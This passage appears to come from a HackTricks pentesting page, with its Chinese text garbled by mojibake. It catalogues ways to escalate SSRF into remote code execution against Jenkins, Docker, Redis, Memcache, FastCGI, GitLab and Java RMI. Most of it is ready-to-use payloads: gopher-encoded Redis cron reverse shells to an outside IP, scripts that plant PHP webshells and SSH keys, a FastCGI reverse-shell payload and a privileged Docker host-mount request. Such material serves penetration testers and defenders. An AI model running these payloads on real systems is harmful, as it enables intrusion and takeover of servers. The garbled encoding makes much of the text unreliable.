To exploit this vulnerability, you need to identify a SSRF vulnerability that allows you to make requests to internal resources. Once you have identified such a vulnerability, you can use Groovy's ability to execute arbitrary code to achieve RCE.

è¦åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œä½ éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå…è®¸ä½ å‘å†…éƒ¨èµ„æºå‘èµ·è¯·æ±‚çš„SSRFæ¼æ´ã€‚ä¸€æ—¦ä½ æ‰¾åˆ°äº†è¿™æ ·çš„æ¼æ´ï¼Œä½ å¯ä»¥åˆ©ç”¨Groovyæ‰§è¡Œä»»æ„ä»£ç æ¥å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

Here is an example of how to achieve RCE using Groovy:

ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨Groovyå®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„ç¤ºä¾‹ï¼š

```groovy
import java.lang.ProcessBuilder

def command = "ls -la"
def process = new ProcessBuilder(command.split(" ")).redirectErrorStream(true).start()
def output = process.inputStream.text

println output
```

In this example, the Groovy script executes the "ls -la" command, which lists the files and directories in the current directory. You can replace this command with any other command you want to execute on the target system.

åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼ŒGroovyè„šæœ¬æ‰§è¡Œäº†"ls -la"å‘½ä»¤ï¼Œè¯¥å‘½ä»¤åˆ—å‡ºäº†å½“å‰ç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•ã€‚ä½ å¯ä»¥å°†è¿™ä¸ªå‘½ä»¤æ›¿æ¢ä¸ºä½ æƒ³åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œçš„ä»»ä½•å…¶ä»–å‘½ä»¤ã€‚

To exploit the SSRF vulnerability, you need to find a way to make the Groovy script execute on the target system. This can be done by injecting the script into a vulnerable parameter or by uploading a file containing the script and then executing it.

è¦åˆ©ç”¨SSRFæ¼æ´ï¼Œä½ éœ€è¦æ‰¾åˆ°ä¸€ç§æ–¹æ³•è®©Groovyè„šæœ¬åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œã€‚å¯ä»¥é€šè¿‡å°†è„šæœ¬æ³¨å…¥åˆ°ä¸€ä¸ªæœ‰æ¼æ´çš„å‚æ•°ä¸­ï¼Œæˆ–è€…é€šè¿‡ä¸Šä¼ åŒ…å«è„šæœ¬çš„æ–‡ä»¶ç„¶åæ‰§è¡Œå®ƒæ¥å®ç°ã€‚

Remember that exploiting SSRF vulnerabilities for RCE is highly dependent on the specific context and the security measures in place. It is important to thoroughly understand the target system and its vulnerabilities before attempting any exploitation.

è¯·è®°ä½ï¼Œåˆ©ç”¨SSRFæ¼æ´å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œé«˜åº¦ä¾èµ–äºç‰¹å®šçš„ä¸Šä¸‹æ–‡å’Œç°æœ‰çš„å®‰å…¨æªæ–½ã€‚åœ¨å°è¯•ä»»ä½•åˆ©ç”¨ä¹‹å‰ï¼Œå……åˆ†äº†è§£ç›®æ ‡ç³»ç»ŸåŠå…¶æ¼æ´æ˜¯éå¸¸é‡è¦çš„ã€‚
```
cmd = 'curl burp_collab'
pay = 'public class x {public x(){"%s".execute()}}' % cmd
data = 'http://jenkins.internal/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=' + urllib.quote(pay)
```
## Hystrix ä»ªè¡¨æ¿

**å¸¸è§ç»‘å®šç«¯å£ï¼š80ã€443ï¼ˆSSLï¼‰ã€8080**

Spring Cloud Netflixï¼Œç‰ˆæœ¬ 2.2.x åœ¨ 2.2.4 ä¹‹å‰ï¼Œç‰ˆæœ¬ 2.1.x åœ¨ 2.1.6 ä¹‹å‰ã€‚

**SSRF é‡‘ä¸é›€ï¼šCVE-2020-5412**
```bash
/proxy.stream?origin=http://SSRF_CANARY/
```
## W3 Total Cache

**å¸¸è§ç»‘å®šç«¯å£ï¼š80ã€443ï¼ˆSSLï¼‰**

W3 Total Cache 0.9.2.6-0.9.3

**SSRF Canary: CVE-2019-6715**

è¿™éœ€è¦æ˜¯ä¸€ä¸ªPUTè¯·æ±‚ï¼š
```bash
PUT /wp-content/plugins/w3-total-cache/pub/sns.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36
Content-Length: 124
Content-Type: application/x-www-form-urlencoded
Connection: close

{"Type":"SubscriptionConfirmation","Message":"","SubscribeURL":"https://SSRF_CANARY"}
```
**SSRFé‡‘ä¸é›€**

æ­¤æ¼æ´çš„å…¬å‘Šåœ¨æ­¤å¤„å‘å¸ƒï¼š[W3 Total Cache SSRFæ¼æ´](https://klikki.fi/adv/w3\_total\_cache.html)

æ­¤PHPä»£ç å°†ä¸ºæ‚¨çš„SSRFé‡‘ä¸é›€ä¸»æœºç”Ÿæˆæœ‰æ•ˆè½½è·ï¼ˆå°†`url`æ›¿æ¢ä¸ºæ‚¨çš„é‡‘ä¸é›€ä¸»æœºï¼‰ï¼š
```php
<?php

$url='http://www.google.com';
$file=strtr(base64_encode(gzdeflate($url.'#https://ajax.googleapis.com')), '+/=', '-_');
$file=chop($file,'=');
$req='/wp-content/plugins/w3-total-cache/pub/minify.php?file='.$file.'.css';
echo($req);

?>
```
## Docker

**å¸¸è§ç»‘å®šç«¯å£ï¼š2375ï¼Œ2376ï¼ˆSSLï¼‰**

å¦‚æœä½ é‡åˆ°éƒ¨åˆ†ç›²çš„SSRFï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è·¯å¾„æ¥éªŒè¯Docker APIçš„å­˜åœ¨ï¼š
```bash
/containers/json
/secrets
/services
```
**é€šè¿‡è¿è¡Œä»»æ„çš„Dockeré•œåƒå®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰**

In some cases, a vulnerable SSRF can be exploited to run an arbitrary Docker image, which can lead to remote command execution (RCE) on the server. This occurs when the SSRF vulnerability allows the attacker to specify a URL that points to a Docker image, which is then pulled and executed by the server.

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯ä»¥åˆ©ç”¨å­˜åœ¨æ¼æ´çš„SSRFæ¥è¿è¡Œä»»æ„çš„Dockeré•œåƒï¼Œä»è€Œå¯¼è‡´æœåŠ¡å™¨ä¸Šçš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰ã€‚å½“SSRFæ¼æ´å…è®¸æ”»å‡»è€…æŒ‡å®šä¸€ä¸ªæŒ‡å‘Dockeré•œåƒçš„URLæ—¶ï¼ŒæœåŠ¡å™¨ä¼šæ‹‰å–å¹¶æ‰§è¡Œè¯¥é•œåƒã€‚

To exploit this vulnerability, the attacker needs to find a way to make the server pull and execute the Docker image. This can be achieved by providing a malicious URL as the SSRF target, which points to a Docker image hosted on a remote server controlled by the attacker.

ä¸ºäº†åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…éœ€è¦æ‰¾åˆ°ä¸€ç§æ–¹æ³•è®©æœåŠ¡å™¨æ‹‰å–å¹¶æ‰§è¡ŒDockeré•œåƒã€‚è¿™å¯ä»¥é€šè¿‡å°†æ¶æ„URLä½œä¸ºSSRFç›®æ ‡æä¾›ï¼Œè¯¥URLæŒ‡å‘ç”±æ”»å‡»è€…æ§åˆ¶çš„è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„Dockeré•œåƒã€‚

Once the server pulls the Docker image, the attacker can include a payload or command within the image that will be executed by the server. This allows the attacker to execute arbitrary commands on the server, potentially gaining full control over it.

ä¸€æ—¦æœåŠ¡å™¨æ‹‰å–äº†Dockeré•œåƒï¼Œæ”»å‡»è€…å¯ä»¥åœ¨é•œåƒä¸­åŒ…å«ä¸€ä¸ªå°†ç”±æœåŠ¡å™¨æ‰§è¡Œçš„æœ‰æ•ˆè½½è·æˆ–å‘½ä»¤ã€‚è¿™ä½¿å¾—æ”»å‡»è€…å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæ½œåœ¨åœ°å®Œå…¨æ§åˆ¶æœåŠ¡å™¨ã€‚

To prevent this type of attack, it is important to properly validate and sanitize any user-supplied input, especially when it is used to construct URLs or make requests to external resources. Additionally, restricting the server's access to external resources and implementing proper access controls can help mitigate the risk of SSRF vulnerabilities.
```http
POST /containers/create?name=test HTTP/1.1
Host: website.com
Content-Type: application/json
...

{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}
```
å°†alpineæ›¿æ¢ä¸ºæ‚¨å¸Œæœ›Dockerå®¹å™¨è¿è¡Œçš„ä»»æ„é•œåƒã€‚

## Gitlab Prometheus Redis Exporter

**å¸¸è§ç»‘å®šç«¯å£ï¼š9121**

æ­¤æ¼æ´å½±å“Gitlabç‰ˆæœ¬13.1.1ä¹‹å‰çš„å®ä¾‹ã€‚æ ¹æ®[Gitlabæ–‡æ¡£](https://docs.gitlab.com/ee/administration/monitoring/prometheus/#configuring-prometheus)çš„è¯´æ˜ï¼Œ`ä»GitLab 9.0å¼€å§‹ï¼Œé»˜è®¤æƒ…å†µä¸‹å¯ç”¨PrometheusåŠå…¶å¯¼å‡ºå™¨`ã€‚

è¿™äº›å¯¼å‡ºå™¨ä¸ºæ”»å‡»è€…æä¾›äº†ä¸€ä¸ªç»ä½³çš„æ–¹æ³•ï¼Œå¯ä»¥ä½¿ç”¨CVE-2020-13379æ¥è½¬å‘å¹¶æ”»å‡»å…¶ä»–æœåŠ¡ã€‚å…¶ä¸­ä¸€ä¸ªå®¹æ˜“å—åˆ°æ”»å‡»çš„å¯¼å‡ºå™¨æ˜¯Rediså¯¼å‡ºå™¨ã€‚

é€šè¿‡ä»¥ä¸‹ç«¯ç‚¹ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ç›®æ ‡å‚æ•°æ¥è½¬å‚¨redisæœåŠ¡å™¨ä¸­çš„æ‰€æœ‰é”®ï¼š
```bash
http://localhost:9121/scrape?target=redis://127.0.0.1:7001&check-keys=*
```
**é€šè¿‡Gopherå¯èƒ½å®ç°**

## Redis

**å¸¸è§ç»‘å®šç«¯å£ï¼š6379**

æ¨èé˜…è¯»ï¼š

* [å°è¯•é€šè¿‡HTTPè¯·æ±‚æ¥æ”»å‡»Redis](https://www.agarri.fr/blog/archives/2014/09/11/trying\_to\_hack\_redis\_via\_http\_requests/index.html)
* [é’ˆå¯¹Redisçš„SSRFæ¼æ´åˆ©ç”¨](https://maxchadwick.xyz/blog/ssrf-exploits-against-redis)

**é€šè¿‡Cronå®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰** - [Gopheræ”»å‡»é¢](https://blog.chaitin.cn/gopher-attack-surfaces/)
```bash
redis-cli -h $1 flushall
echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1\n\n"|redis-cli -h $1 -x set 1
redis-cli -h $1 config set dir /var/spool/cron/
redis-cli -h $1 config set dbfilename root
redis-cli -h $1 save
```
Gopher:

Gopheræ˜¯ä¸€ç§åè®®ï¼Œç”¨äºåœ¨äº’è”ç½‘ä¸Šæ£€ç´¢æ–‡æ¡£ã€‚å®ƒç±»ä¼¼äºHTTPï¼Œä½†åŠŸèƒ½è¾ƒä¸ºç®€å•ã€‚SSRFæ¼æ´é€šå¸¸å¯ä»¥åˆ©ç”¨Gopheråè®®æ¥å‘èµ·è¯·æ±‚ï¼Œä»è€Œå¯¼è‡´æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼ˆSSRFï¼‰æ”»å‡»ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å®¹æ˜“å—åˆ°SSRFæ”»å‡»çš„å¹³å°å’Œæ¡†æ¶ï¼š

- PHPï¼šåœ¨ä½¿ç”¨file_get_contents()æˆ–curl_exec()ç­‰å‡½æ•°æ—¶ï¼Œæœªå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œé€‚å½“çš„è¿‡æ»¤å’ŒéªŒè¯ã€‚
- Javaï¼šåœ¨ä½¿ç”¨URLç±»æˆ–HttpURLConnectionç±»æ—¶ï¼Œæœªå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œé€‚å½“çš„è¿‡æ»¤å’ŒéªŒè¯ã€‚
- Rubyï¼šåœ¨ä½¿ç”¨open-uriåº“æ—¶ï¼Œæœªå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œé€‚å½“çš„è¿‡æ»¤å’ŒéªŒè¯ã€‚
- Pythonï¼šåœ¨ä½¿ç”¨urllibåº“æˆ–requestsåº“æ—¶ï¼Œæœªå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œé€‚å½“çš„è¿‡æ»¤å’ŒéªŒè¯ã€‚
- Node.jsï¼šåœ¨ä½¿ç”¨httpæˆ–httpsæ¨¡å—æ—¶ï¼Œæœªå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œé€‚å½“çš„è¿‡æ»¤å’ŒéªŒè¯ã€‚
- Ruby on Railsï¼šåœ¨ä½¿ç”¨open-uriåº“æ—¶ï¼Œæœªå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œé€‚å½“çš„è¿‡æ»¤å’ŒéªŒè¯ã€‚
- Djangoï¼šåœ¨ä½¿ç”¨urllibåº“æˆ–requestsåº“æ—¶ï¼Œæœªå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œé€‚å½“çš„è¿‡æ»¤å’ŒéªŒè¯ã€‚

è¦é˜²æ­¢SSRFæ”»å‡»ï¼Œåº”è¯¥å§‹ç»ˆå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤å’ŒéªŒè¯ï¼Œç¡®ä¿åªå…è®¸è®¿é—®å¯ä¿¡ä»»çš„èµ„æºã€‚
```bash
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```
**é€šè¿‡Shellä¸Šä¼ å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆPHPï¼‰** - [Redis Getshellæ¦‚è¿°](https://www.mdeditor.tw/pl/pBy0)
```python
#!/usr/bin/env python
# -*-coding:utf-8-*-

import urllib
protocol="gopher://"
ip="192.168.189.208"
port="6379"
shell="\n\n<?php phpinfo();?>\n\n"
filename="shell.php"
path="/var"
passwd=""

cmd=["flushall",
"set 1 {}".format(shell.replace(" ","${IFS}")),
"config set dir {}".format(path),
"config set dbfilename {}".format(filename),
"save"
]
if passwd:
cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
CRLF="\r\n"
redis_arr = arr.split(" ")
cmd=""
cmd+="*"+str(len(redis_arr))
for x in redis_arr:
cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
cmd+=CRLF
return cmd

if __name__=="__main__":
for x in cmd:
payload += urllib.quote(redis_format(x))
print payload
```
**é€šè¿‡ authorized\_keys è¿›è¡Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰** - [Redis Getshell æ¦‚è¿°](https://www.mdeditor.tw/pl/pBy0)
```python
import urllib
protocol="gopher://"
ip="192.168.189.208"
port="6379"
# shell="\n\n<?php eval($_GET[\"cmd\"]);?>\n\n"
sshpublic_key = "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8IOnJUAt5b/5jDwBDYJTDULjzaqBe2KW3KhqlaY58XveKQRBLrG3ZV0ffPnIW5SLdueunb4HoFKDQ/KPXFzyvVjqByj5688THkq1RJkYxGlgFNgMoPN151zpZ+eCBdFZEf/m8yIb3/7Cp+31s6Q/DvIFif6IjmVRfWXhnkjNehYjsp4gIEBiiW/jWId5yrO9+AwAX4xSabbxuUyu02AQz8wp+h8DZS9itA9m7FyJw8gCrKLEnM7PK/ClEBevDPSR+0YvvYtnUxeCosqp9VrjTfo5q0nNg9JAvPMs+EA1ohUct9UyXbTehr1Bdv4IXx9+7Vhf4/qwle8HKali3feIZ root@kali\n\n"
filename="authorized_keys"
path="/root/.ssh/"
passwd=""
cmd=["flushall",
"set 1 {}".format(sshpublic_key.replace(" ","${IFS}")),
"config set dir {}".format(path),
"config set dbfilename {}".format(filename),
"save"
]
if passwd:
cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
CRLF="\r\n"
redis_arr = arr.split(" ")
cmd=""
cmd+="*"+str(len(redis_arr))
for x in redis_arr:
cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
cmd+=CRLF
return cmd

if __name__=="__main__":
for x in cmd:
payload += urllib.quote(redis_format(x))
print payload
```
**é€šè¿‡Gitåè®®åœ¨GitLabä¸Šå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰**

[è¿™é‡Œ](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/)æ˜¯Liveoverflowçš„ç²¾å½©è§£è¯»ã€‚

è™½ç„¶è¿™éœ€è¦å¯¹GitLabè¿›è¡Œèº«ä»½éªŒè¯æ‰èƒ½åˆ©ç”¨ï¼Œä½†æˆ‘åœ¨è¿™é‡ŒåŒ…å«äº†æœ‰æ•ˆè½½è·ï¼Œå› ä¸º`git`åè®®å¯èƒ½é€‚ç”¨äºæ‚¨æ­£åœ¨æ”»å‡»çš„ç›®æ ‡ã€‚æ­¤æœ‰æ•ˆè½½è·ä»…ä¾›å‚è€ƒã€‚
```bash
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
## Memcache

**å¸¸è§ç»‘å®šç«¯å£ï¼š11211**

* [vBulletin Memcache RCE](https://www.exploit-db.com/exploits/37815)
* [GitHub Enterprise Memcache RCE](https://www.exploit-db.com/exploits/42392)
* [Memcacheçš„Gopherè´Ÿè½½ç¤ºä¾‹](https://blog.safebuff.com/2016/07/03/SSRF-Tips/#SSRF-memcache-Getshell)
```bash
gopher://[target ip]:11211/_%0d%0aset ssrftest 1 0 147%0d%0aa:2:{s:6:"output";a:1:{s:4:"preg";a:2:{s:6:"search";s:5:"/.*/e";s:7:"replace";s:33:"eval(base64_decode($_POST[ccc]));";}}s:13:"rewritestatus";i:1;}%0d%0a
gopher://192.168.10.12:11211/_%0d%0adelete ssrftest%0d%0a
```
## Apache Tomcat

**å¸¸è§ç»‘å®šç«¯å£ï¼š80ã€443ï¼ˆSSLï¼‰ã€8080ã€8443ï¼ˆSSLï¼‰**

ä»…é€‚ç”¨äºTomcat 6ï¼š

[gopher-tomcat-deployer](https://github.com/pimps/gopher-tomcat-deployer)

ä½¿ç”¨æ­¤æŠ€æœ¯çš„CTFè§£é¢˜æŠ¥å‘Šï¼š

[ä»XXEåˆ°RCEï¼šPwn2Win CTF 2018è§£é¢˜æŠ¥å‘Š](https://bookgin.tw/2018/12/04/from-xxe-to-rce-pwn2win-ctf-2018-writeup/)

## FastCGI

**å¸¸è§ç»‘å®šç«¯å£ï¼š80ã€443ï¼ˆSSLï¼‰**

æ­¤å†…å®¹æ¥æºäº[è¿™é‡Œ](https://blog.chaitin.cn/gopher-attack-surfaces/)ã€‚
```bash
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00
```
## Java RMI

**å¸¸è§ç»‘å®šç«¯å£ï¼š1090ã€1098ã€1099ã€1199ã€4443-4446ã€8999-9010ã€9999**

å¯ä»¥åˆ©ç”¨å…è®¸ä»»æ„å­—èŠ‚ï¼ˆåŸºäº gopherï¼‰çš„ç›² _SSRF_ æ¼æ´å¯¹ _Java RMI_ é»˜è®¤ç»„ä»¶ï¼ˆ_RMI Registry_ã€_Distributed Garbage Collector_ã€_Activation System_ï¼‰è¿›è¡Œååºåˆ—åŒ–æˆ–ä»£ç åº“æ”»å‡»ã€‚å¯ä»¥åœ¨[è¿™é‡Œ](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)æ‰¾åˆ°è¯¦ç»†çš„å†™ä½œã€‚ä»¥ä¸‹ç¤ºä¾‹æ˜¾ç¤ºäº†æœ‰æ•ˆè½½è·ç”Ÿæˆçš„ç¤ºä¾‹ï¼š
```
$ rmg serial 127.0.0.1 1090 CommonsCollections6 'curl example.burpcollaborator.net' --component reg --ssrf --gopher
[+] Creating ysoserial payload... done.
[+]
[+] Attempting deserialization attack on RMI Registry endpoint...
[+]
[+] 	SSRF Payload: gopher://127.0.0.1:1090/_%4a%52%4d%49%00%02%4c%50%ac%ed%00%05%77%22%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%02%44%15%4d[...]
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
